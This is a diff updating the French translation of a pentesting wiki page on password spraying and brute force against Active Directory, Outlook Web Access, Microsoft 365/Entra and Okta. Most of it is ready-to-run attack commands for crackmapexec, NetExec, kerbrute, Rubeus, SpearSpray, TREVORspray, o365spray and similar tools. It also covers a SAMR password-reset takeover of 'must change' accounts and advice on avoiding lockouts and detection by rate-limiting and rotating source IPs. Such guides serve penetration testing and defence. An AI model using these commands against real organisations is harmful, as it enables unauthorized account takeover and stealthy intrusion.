@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-Une fois que vous avez trouvé plusieurs **noms d’utilisateur valides**, vous pouvez essayer les **mots de passe les plus courants** (gardez à l’esprit la policy de mot de passe de l’environnement) avec chacun des utilisateurs découverts.\
-Par **défaut**, la **longueur minimale** du **mot de passe** est de **7**.
+Une fois que vous avez trouvé plusieurs **noms d'utilisateur valides**, vous pouvez essayer les **mots de passe les plus courants** (en tenant compte de la politique de mots de passe de l'environnement) avec chacun des utilisateurs identifiés.\
+Par **défaut**, la **longueur** **minimale** d'un **mot de passe** est de **7**.
 
-Des listes de noms d’utilisateur courants peuvent aussi être utiles : [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Les listes de noms d'utilisateur courants peuvent également être utiles : [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Remarquez que vous **pourriez verrouiller certains comptes si vous essayez plusieurs mauvais mots de passe** (par défaut plus de 10).
+Notez que vous **pourriez verrouiller certains comptes si vous essayez plusieurs mots de passe incorrects** (par défaut, plus de 10).
 
-### Get password policy
+### Obtenir la politique de mots de passe
 
-Si vous avez des identifiants d’utilisateur ou un shell en tant qu’utilisateur de domaine, vous pouvez **obtenir la policy de mot de passe avec** :
+Si vous disposez des identifiants d'un utilisateur ou d'un shell en tant qu'utilisateur de domaine, vous pouvez **obtenir la politique de mots de passe avec** :
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -33,14 +33,14 @@ net accounts
 ```
 ### Exploitation depuis Linux (ou tous)
 
-- En utilisant **crackmapexec:**
+- En utilisant **crackmapexec** :
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-- Utiliser **NetExec (successeur de CME)** pour un password spraying ciblé et à faible bruit sur SMB/WinRM :
+- Utilisation de **NetExec (CME successor)** pour un spraying ciblé et discret via SMB/WinRM :
 ```bash
 # Optional: generate a hosts entry to ensure Kerberos FQDN resolution
 netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts
@@ -55,27 +55,27 @@ netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"
 # Tip: sync your clock before Kerberos-based auth to avoid skew issues
 sudo ntpdate <DC_FQDN>
 ```
-- En utilisant [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
+- Avec [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**spray**](https://github.com/Greenwolf/Spray) _**(vous pouvez indiquer le nombre de tentatives pour éviter les verrouillages) :**_
+- [**spray**](https://github.com/Greenwolf/Spray) _**(vous pouvez indiquer le nombre de tentatives pour éviter les verrouillages) :**_<sup>[[3]](#references)</sup>
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - PAS TOUJOURS RECOMMANDÉ PARFOIS NE FONCTIONNE PAS
+- Utilisation de [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NON RECOMMANDÉ, NE FONCTIONNE PARFOIS PAS<sup>[[2]](#references)</sup>
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
 - Avec le module `scanner/smb/smb_login` de **Metasploit** :
 
-![](<../../images/image (745).png>)
+![Password Spraying - Brute-Force : avec le module scanner/smb/smb login de Metasploit](<../../images/image (745).png>)
 
-- En utilisant **rpcclient** :
+- Avec **rpcclient** :<sup>[[6]](#references)</sup>
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
@@ -84,7 +84,7 @@ done
 ```
 #### Depuis Windows
 
-- Avec la version de [Rubeus](https://github.com/Zer1t0/Rubeus) avec le module brute:
+- Avec une version de [Rubeus](https://github.com/Zer1t0/Rubeus) disposant du module brute :
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -92,7 +92,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Avec [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Il peut générer les utilisateurs du domaine par défaut et récupérera la policy de mot de passe du domaine, puis limitera les tentatives en conséquence):
+- Avec [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Il peut générer les utilisateurs du domaine par défaut et récupérer la password policy du domaine afin de limiter les tentatives en fonction de celle-ci) :<sup>[[4]](#references)</sup>
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -100,12 +100,12 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 Invoke-SprayEmptyPassword
 ```
-### Identifier et prendre le contrôle des comptes "Password must change at next logon" (SAMR)
+### Identifier et prendre le contrôle des comptes « Password must change at next logon » (SAMR)
 
-Une technique à faible bruit consiste à faire du spraying avec un mot de passe bénin/vide et à repérer les comptes renvoyant STATUS_PASSWORD_MUST_CHANGE, ce qui indique que le mot de passe a été forcé à expiration et peut être changé sans connaître l’ancien.
+Une technique à faible bruit consiste à tester par spray un mot de passe bénin/vide et à repérer les comptes renvoyant STATUS_PASSWORD_MUST_CHANGE, ce qui indique que le mot de passe a été forcé à expirer et qu’il peut être modifié sans connaître l’ancien.<sup>[[9]](#references)[[10]](#references)</sup>
 
 Workflow :
-- Énumérer les utilisateurs (RID brute via SAMR) pour construire la liste des cibles :
+- Énumérer les utilisateurs (RID brute force via SAMR) afin de constituer la liste des cibles :
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
@@ -114,12 +114,12 @@ Workflow :
 # NetExec (null/guest) + RID brute to harvest users
 netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
 ```
-- Effectuer un password spraying avec un mot de passe vide et continuer en cas de réussite afin de capturer les comptes qui doivent changer le mot de passe au prochain logon:
+- Effectuez un password spraying avec un mot de passe vide et continuez sur les correspondances pour identifier les comptes qui doivent changer leur mot de passe à la prochaine connexion :
 ```bash
 # Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
 netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
 ```
-- Pour chaque résultat, changez le mot de passe via SAMR avec le module de NetExec (aucun ancien mot de passe n'est nécessaire lorsque "must change" est défini) :
+- Pour chaque résultat, changez le mot de passe via SAMR avec le module de NetExec (aucien ancien mot de passe n’est nécessaire lorsque « must change » est défini) :
 ```bash
 # Strong complexity to satisfy policy
 env NEWPASS='P@ssw0rd!2025#' ; \
@@ -128,25 +128,25 @@ netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
 # Validate and retrieve domain password policy with the new creds
 netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
 ```
-Notes opérationnelles :
-- Assurez-vous que l’horloge de votre hôte est synchronisée avec le DC avant les opérations basées sur Kerberos : `sudo ntpdate <dc_fqdn>`.
-- Un `[+]` sans `(Pwn3d!)` dans certains modules (par ex. RDP/WinRM) signifie que les identifiants sont valides mais que le compte n’a pas les droits de connexion interactive.
+Operational notes :
+- Ensurez-vous que l’horloge de votre host est synchronisée avec celle du DC avant les opérations basées sur Kerberos : `sudo ntpdate <dc_fqdn>`.
+- Un [+] sans (Pwn3d!) dans certains modules (par ex. RDP/WinRM) signifie que les creds sont valides, mais que le compte ne dispose pas des droits de connexion interactive.
 
 ## Brute Force
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
+### Spraying de pré-authentification Kerberos avec ciblage LDAP et limitation adaptative tenant compte des PSO (SpearSpray)
 
-Le spraying basé sur la pre-auth Kerberos réduit le bruit par rapport aux tentatives SMB/NTLM/LDAP bind et s’aligne mieux avec les politiques de lockout AD. SpearSpray combine un ciblage piloté par LDAP, un moteur de patterns, et la prise en compte des politiques (politique de domaine + PSOs + buffer badPwdCount) pour faire du spray de manière précise et sûre. Il peut aussi marquer les principals compromis dans Neo4j pour le pathing BloodHound.
+Le spraying basé sur la pré-authentification Kerberos réduit le bruit par rapport aux tentatives SMB/NTLM/LDAP bind et s’aligne mieux sur les politiques de verrouillage AD. SpearSpray associe un ciblage piloté par LDAP, un moteur de patterns et une prise en compte des politiques (politique de domaine + PSO + marge pour `badPwdCount`) afin d’effectuer un spraying précis et sûr. Il peut également marquer les principaux compromis dans Neo4j pour le pathing BloodHound.<sup>[[1]](#references)</sup>
 
 Idées clés :
-- Découverte des users via LDAP avec paging et support LDAPS, en utilisant éventuellement des filtres LDAP custom.
-- Filtrage tenant compte de la politique de lockout du domaine + PSO pour laisser un buffer d’essais configurable (threshold) et éviter de lock les users.
-- Validation de la pre-auth Kerberos en utilisant des bindings gssapi rapides (génère 4768/4771 sur les DCs au lieu de 4625).
-- Génération de mots de passe par utilisateur, basée sur des patterns, avec des variables comme les noms et des valeurs temporelles dérivées du pwdLastSet de chaque user.
-- Contrôle du débit avec threads, jitter, et un maximum de requêtes par seconde.
-- Intégration Neo4j optionnelle pour marquer les users owned pour BloodHound.
+- Découverte des utilisateurs LDAP avec pagination et prise en charge de LDAPS, avec possibilité d’utiliser des filtres LDAP personnalisés.
+- Filtrage tenant compte de la politique de verrouillage du domaine et des PSO, afin de conserver une marge configurable de tentatives (`threshold`) et d’éviter le verrouillage des utilisateurs.
+- Validation de la pré-authentification Kerberos à l’aide de bindings gssapi rapides (génère les événements 4768/4771 sur les DC plutôt que 4625).
+- Génération de mots de passe par utilisateur basée sur des patterns, à l’aide de variables telles que les noms et les valeurs temporelles dérivées du `pwdLastSet` de chaque utilisateur.
+- Contrôle du débit avec des threads, du jitter et un nombre maximal de requêtes par seconde.
+- Intégration facultative avec Neo4j pour marquer les utilisateurs compromis dans BloodHound.
 
 Utilisation de base et découverte :
 ```bash
@@ -159,7 +159,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # LDAPS (TCP/636)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
-Ciblage et contrôle des motifs:
+Ciblage et contrôle des motifs :
 ```bash
 # Custom LDAP filter (e.g., target specific OU/attributes)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
@@ -168,7 +168,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
-Contrôles de discrétion et de sécurité :
+Contrôles de furtivité et de sécurité :
 ```bash
 # Control concurrency, add jitter, and cap request rate
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10
@@ -176,11 +176,11 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Leave N attempts in reserve before lockout (default threshold: 2)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
 ```
-Neo4j/BloodHound enrichment:
+Enrichissement de Neo4j/BloodHound :
 ```bash
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
 ```
-Vue d'ensemble du système de patterns (patterns.txt):
+Présentation générale du système de patterns (patterns.txt) :
 ```text
 # Example templates consuming per-user attributes and temporal context
 {name}{separator}{year}{suffix}
@@ -195,6 +195,7 @@ Available variables include:
 - Composition helpers and org token: {separator}, {suffix}, {extra}
 
 Operational notes:
+
 - Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
 - badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
 - Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.
@@ -203,15 +204,15 @@ Operational notes:
 
 ## Outlook Web Access
 
-There are multiples tools for p**assword spraying outlook**.
+There are multiple tools for p**assword spraying Outlook**.
 
 - With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
 - with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
-- With [Ruler](https://github.com/sensepost/ruler) (fiable !)
+- With [Ruler](https://github.com/sensepost/ruler) (reliable!)<sup>[[5]](#references)</sup>
 - With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-To use any of these tools, you need a user list and a password / a small list of passwords to spray.
+Pour utiliser l’un de ces outils, vous avez besoin d’une liste d’utilisateurs et d’un mot de passe / d’une petite liste de mots de passe à tester.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -222,15 +223,15 @@ To use any of these tools, you need a user list and a password / a small list of
 ```
 ## Microsoft 365 / Entra ID
 
-Pour le cloud spraying, identifiez d’abord si le tenant est **managed**, **federated**, ou **hybrid**, car l’endpoint et le comportement de lockout peuvent différer de l’AD on-prem. Dans Microsoft Entra, **Smart Lockout** modifie la manière dont les tentatives répétées consomment le budget de lockout :
+Pour le spraying cloud, identifiez d'abord si le tenant est **managed**, **federated** ou **hybrid**, car l'endpoint et le comportement du lockout peuvent différer d'Active Directory local. Dans Microsoft Entra, **Smart Lockout** modifie la manière dont les tentatives répétées consomment le lockout budget :<sup>[[7]](#references)</sup>
 
-- Répéter le **même mauvais mot de passe** n’augmente pas le compteur de lockout, mais essayer de **nouveaux candidats** oui.
-- Les emplacements **familiar** et **unfamiliar** ont des compteurs **séparés**.
-- Les tenants utilisant **pass-through authentication (PTA)** ne bénéficient pas du suivi des hashs de mauvais mots de passe, donc traitez-les davantage comme des cibles classiques sensibles au lockout.
+- Répéter le **même mot de passe erroné** n'incrémente pas continuellement le lockout counter, mais essayer de **nouveaux candidats** l'incrémente.
+- Les emplacements **familiers** et **non familiers** disposent de compteurs distincts.
+- Les tenants utilisant l'**authentification pass-through (PTA)** ne bénéficient pas du suivi des hash de mots de passe erronés ; traitez-les donc davantage comme des cibles classiques sensibles au lockout.
 
-En pratique, faites du spray avec **un mot de passe par round**, laissez suffisamment d’espace entre les rounds, et privilégiez des outils capables de détecter le flux d’authentification réel du tenant avant d’envoyer des tentatives.
+En pratique, effectuez le spray **d'un seul mot de passe par round**, laissez suffisamment d'intervalle entre les rounds et privilégiez les outils capables de découvrir le flux d'authentification réel du tenant avant d'envoyer des tentatives.
 
-- Avec [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), vous pouvez faire du recon sur le tenant, découvrir le `token_endpoint`, faire du spray sur `msol`/`adfs`/`owa`/`okta`, et faire tourner le trafic via plusieurs egress IPs :
+- Avec [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), vous pouvez effectuer la reconnaissance du tenant, découvrir le `token_endpoint`, effectuer le spray sur `msol`/`adfs`/`owa`/`okta` et faire transiter le trafic par plusieurs IP de sortie :
 ```bash
 # Enumerate tenant info, autodiscover, and the token endpoint
 trevorspray --recon corp.com
@@ -245,7 +246,7 @@ trevorspray -u users.txt -p 'Winter2025!' \
 --url https://login.windows.net/<tenant-id>/oauth2/token \
 --ssh root@1.2.3.4 root@4.3.2.1 --delay 5
 ```
-- Avec [**Spray365**](https://github.com/MarkoH17/Spray365), vous pouvez pré-construire un **execution plan** reprisable, randomiser l’ordre d’authentification, et imposer un **minimum delay per user** pour rester en dehors de la fenêtre de lockout :
+- Avec [**Spray365**](https://github.com/MarkoH17/Spray365), vous pouvez pré-construire un **plan d’exécution** reprenable, randomiser l’ordre d’authentification et imposer un **délai minimal par utilisateur** pour rester en dehors de la fenêtre de verrouillage :
 ```bash
 # Generate a plan with shuffled auth order and a per-user minimum delay
 python3 spray365.py generate normal -ep plan.s365 -d corp.com \
@@ -255,13 +256,13 @@ python3 spray365.py generate normal -ep plan.s365 -d corp.com \
 # Execute the plan and abort after observing several lockouts
 python3 spray365.py spray -ep plan.s365 -l 5
 ```
-- Avec [**o365spray**](https://github.com/0xZDH/o365spray), vous pouvez valider le tenant, énumérer les utilisateurs avec des modules tels que `onedrive`, et faire du spray via `oauth2` ou `adfs` tout en gardant **une tentative par utilisateur** par fenêtre de lockout. Si vous avez déjà une API FireProx, passez-la avec `--proxy-url` pour répartir les IPs sources :
+- Avec [**o365spray**](https://github.com/0xZDH/o365spray), vous pouvez valider le tenant, énumérer les utilisateurs avec des modules tels que `onedrive`, et effectuer du spray via `oauth2` ou `adfs`, tout en limitant à **une tentative par utilisateur** pendant chaque fenêtre de verrouillage. Si vous disposez déjà d’une API FireProx, transmettez-la avec `--proxy-url` afin de répartir les adresses IP sources :
 ```bash
 o365spray --validate --domain corp.com
 o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
 o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
 ```
-La récente technique des opérateurs s’est également orientée vers le **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) prend en charge les fenêtres temporelles, la rotation des mots de passe, le spraying ADFS/M365, et l’exfiltration automatique post-auth. Des abus réels récents ont aussi utilisé l’énumération de comptes via l’**Microsoft Teams API** et la **rotation des régions AWS** pour répartir les vagues de spray sur plusieurs géographies sources.
+Les techniques récentes des opérateurs se sont également orientées vers le **spraying cloud distribué**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) prend en charge les fenêtres temporelles, le mélange des mots de passe, le spraying ADFS/M365 et l’exfiltration post-authentification automatique. Des abus réels récents ont également utilisé l’**API Microsoft Teams** pour l’énumération de comptes et la **rotation des régions AWS** afin de répartir les vagues de spraying entre plusieurs zones géographiques sources.<sup>[[8]](#references)</sup>
 
 ## Google
 
@@ -273,21 +274,17 @@ La récente technique des opérateurs s’est également orientée vers le **dis
 - [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
 - [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
-## References
+## Références
 
-- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
-- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
-- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
-- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
-- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
-- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
-- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
-- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
-- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
-- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
-- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
-- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
-
+- [1] [SpearSpray – Améliorer votre password spraying Active Directory grâce aux informations sur les utilisateurs](https://github.com/sikumy/spearspray)
+- [2] [TarlogicSecurity/kerbrute – Bruteforcing Kerberos avec Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
+- [3] [Spray – Un outil de password spraying pour les identifiants Active Directory](https://github.com/Greenwolf/Spray)
+- [4] [Password spraying Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
+- [5] [Password spraying d’Outlook Web Access : shell distant](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
+- [6] [Password spraying et autres activités amusantes avec RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
+- [7] [Verrouillage intelligent Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
+- [8] [Proofpoint : les attaquants lancent TeamFiltration : campagne de prise de contrôle de comptes](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
+- [9] [HTB Sendai – 0xdf : du spraying à gMSA, puis à DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [10] [HTB: Baby — LDAP anonyme → Password spraying → SeBackupPrivilege → Administrateur du domaine](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 
 {{#include ../../banners/hacktricks-training.md}}
